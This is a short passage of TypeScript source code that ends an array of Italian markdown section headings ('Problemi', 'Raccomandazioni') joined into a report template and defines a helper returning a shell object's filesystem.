      '',
      '## Problemi',
      '',
      '',
      '## Raccomandazioni',
      '',
    ].join('\n'),
    mine,
  );
}

const fs = (sh: Shell) => sh.fs;
